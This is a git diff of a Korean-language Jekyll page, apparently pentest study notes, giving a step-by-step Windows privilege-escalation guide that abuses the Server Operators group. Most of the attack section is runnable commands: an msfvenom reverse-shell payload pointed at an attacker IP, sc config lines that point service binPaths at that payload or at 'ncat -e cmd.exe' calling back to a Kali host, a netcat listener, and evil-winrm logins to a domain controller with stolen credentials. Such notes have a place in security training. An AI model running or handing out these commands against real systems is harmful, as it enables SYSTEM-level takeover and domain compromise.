@@ -1,4 +1,14 @@
+---
+layout: page
+title: Server_Operator_(Group)
+description: >
+  This chapter covers the basics of content creation with Hydejack.
+hide_description: true
+sitemap: false
+---
 
+0. this unordered seed list will be replaced by toc as unordered list
+{:toc}
 
 # Server Operators 그룹을 이용한 권한 상승 가이드
 
@@ -12,7 +22,7 @@ https://www.hackingarticles.in/windows-privilege-escalation-server-operator-grou
 
 - **목표:** 현재 사용자가 `Server Operators` 그룹의 멤버인지 확인합니다.
 
-```powershell(title="사용자 그룹 멤버십 확인")
+```powershell
 whoami /groups
 ```
 
@@ -30,17 +40,17 @@ whoami /groups
   1.  **권한 확인:** `accesschk.exe` 등으로 `Server Operators` 그룹이 수정 가능한 서비스를 찾습니다.
   2.  **페이로드 생성 및 업로드:** `msfvenom`으로 리버스 셸 `exe` 파일을 생성하여 서버에 업로드합니다.
   ```powershell
-msfvenom -p windows/x64/shell/reverse_tcp lhost=192.168.1.205 lport=443 -f exe > shell.exe
-      ```
+  msfvenom -p windows/x64/shell/reverse_tcp lhost=192.168.1.205 lport=443 -f exe > shell.exe
+  ```
   4.  **서비스 경로 변경:** `sc config` 명령어로 취약한 서비스의 `binPath`를 악성 페이로드의 경로로 변경합니다.
-      ```powershell
-      sc config <vulnerable_service> binPath= "C:\Temp\revshell.exe"
-      ```
+  ```powershell
+  sc config <vulnerable_service> binPath= "C:\Temp\revshell.exe"
+  ```
   5.  **서비스 재시작:** `sc stop` 및 `sc start` 명령어로 서비스를 재시작하여 페이로드를 실행시키고, 공격자 리스너에서 `SYSTEM` 셸을 획득합니다.
-      ```powershell
-      sc stop <vulnerable_service>
-      sc start <vulnerable_service>
-      ```
+  ```powershell
+  sc stop <vulnerable_service>
+  sc start <vulnerable_service>
+  ```
 
 #### **벡터 B: 도메인 컨트롤러(DC) 원격 접속 (더 치명적)**
 
@@ -49,9 +59,9 @@ msfvenom -p windows/x64/shell/reverse_tcp lhost=192.168.1.205 lport=443 -f exe >
 - **공격 절차:**
   1.  `Server Operators` 그룹에 속한 사용자의 자격증명을 획득합니다.
   2.  해당 자격증명을 사용하여 `evil-winrm`이나 `xfreerdp` 등으로 도메인 컨트롤러에 직접 원격 접속을 시도합니다.
-      ```bash(title="evil-winrm을 이용한 DC 접속")
-      evil-winrm -i <DC_IP> -u <server_operator_user> -p <password>
-      ```
+  ```bash
+  evil-winrm -i <DC_IP> -u <server_operator_user> -p <password>
+  ```
   3.  DC에 접속한 후, 추가적인 내부 정찰 및 권한 상승 공격을 수행하여 최종적으로 도메인 관리자 권한을 획득합니다.
 
 ---
@@ -62,18 +72,18 @@ msfvenom -p windows/x64/shell/reverse_tcp lhost=192.168.1.205 lport=443 -f exe >
 - 리버스 쉘(revshell)을 생성한 후, 서비스의 실행 파일을 리버스 쉘로 교체
 
 
-```powershell title="Windows"
+```powershell
 services
 sc.exe config VMTools binPath= "C:\Users\aarti\Documents\shell.exe"
 sc.exe stop VMTools
 sc.exe start VMTools
 ```
 
-```powershell title="ncat reverse (Windows)"
+```powershell
 sc.exe config AWSLiteAgent binPath= "C:\Windows\tasks\ncat.exe -e cmd.exe [kali_ip] 443"
 ```
 
-```bash title="ncat reverse (Kali)"
+```bash
 nc -lvnp 443
 ```
 
